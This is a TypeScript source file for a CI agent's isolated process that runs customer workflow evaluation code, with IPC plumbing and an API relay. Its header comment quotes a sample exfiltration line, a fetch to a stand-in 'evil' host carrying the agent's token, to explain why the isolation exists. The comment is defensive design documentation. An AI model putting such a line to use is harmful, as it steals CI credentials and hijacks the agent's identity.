/**
 * The eval child: the only process in which customer EVALUATION code runs.
 *
 * The agent forks this entry once per evaluation job — `__init__`, `__dynamic__`,
 * `__build__` and a global eval round — with an environment built by
 * `buildSanitizedEnv`, so the workflow module, its `filter`, its dynamic `env` /
 * `environment` / `concurrencyGroup` / `matrix` functions and any `DynamicJobFn`
 * load and execute where the agent's credentials are not.
 *
 * They used to run in the agent's own V8 isolate with the agent's `process.env`.
 * A `matrix: async ({ env }) => fetch('https://evil/', { body: env.KICI_AGENT_TOKEN })`
 * in a pull request was therefore enough to take the agent's identity.
 *
 * This file is the IPC shell only; the evaluations themselves live in
 * `eval-dispatch.ts`. Communication uses a message union of its own
 * (`AgentToEvalMessage` / `EvalToAgentMessage`), NOT the step runner's — see the
 * note above the union in `ipc-protocol.ts` for why sharing that one would be a
 * privilege expansion.
 */

import { toErrorMessage } from '@kici-dev/shared';
import { buildKiciApi } from '@kici-dev/sdk/internal';
import type { LogStream } from '@kici-dev/engine';
import type { AgentToEvalMessage, EvalToAgentMessage } from './ipc-protocol.js';
import { installConsoleCapture } from '../console-capture.js';
import { runEvalRequest } from './eval-dispatch.js';

/** Send one message to the agent. A closed channel is not fatal — the agent has moved on. */
function send(msg: EvalToAgentMessage): void {
  try {
    process.send?.(msg);
  } catch {
    // IPC channel closed (the agent gave up on this evaluation).
  }
}

function emit(line: string, stream?: LogStream): void {
  send(stream ? { type: 'log.line', line, stream } : { type: 'log.line', line });
}

// --- Agent API relay (the one privileged message on this union) ---

let apiSeq = 0;
const pendingApiCalls = new Map<
  string,
  { resolve: (v: unknown) => void; reject: (e: Error) => void }
>();

/**
 * Relay one `kici.*` call to the agent.
 *
 * `ctx.kici` is already handed to a `DynamicJobFn` and to a global-eval
 * generator, so this preserves what an evaluation has rather than granting it
 * something new. It is the only relay on the eval union.
 */
function relayApiRequest(method: string, params: Record<string, unknown>): Promise<unknown> {
  const id = `eval-api-${++apiSeq}`;
  return new Promise<unknown>((resolve, reject) => {
    pendingApiCalls.set(id, { resolve, reject });
    send({ type: 'eval.api.request', id, method, params });
  });
}

const kici = buildKiciApi((method, params) => relayApiRequest(method, params ?? {}));

// --- Bootstrap ---

// Route customer `console.*` in a loaded module (and in every evaluation body)
// onto the job's log rather than this child's stdout, which nothing reads.
installConsoleCapture();

process.on('message', (msg: AgentToEvalMessage) => {
  if (msg.type === 'eval.api.response') {
    const pending = pendingApiCalls.get(msg.id);
    if (!pending) return;
    pendingApiCalls.delete(msg.id);
    if (msg.error !== undefined) pending.reject(new Error(msg.error));
    else pending.resolve(msg.result);
    return;
  }

  if (msg.type !== 'eval') return;
  void runEvalRequest(msg.request, { emit, kici }).then(
    (result) => {
      send({ type: 'eval.result', result });
      // Exit rather than idle: a customer module may have left a timer or an
      // open handle behind, and the child has nothing left to do.
      process.exit(0);
    },
    (err) => {
      send({ type: 'eval.error', error: toErrorMessage(err) });
      process.exit(1);
    },
  );
});

send({ type: 'ready' });
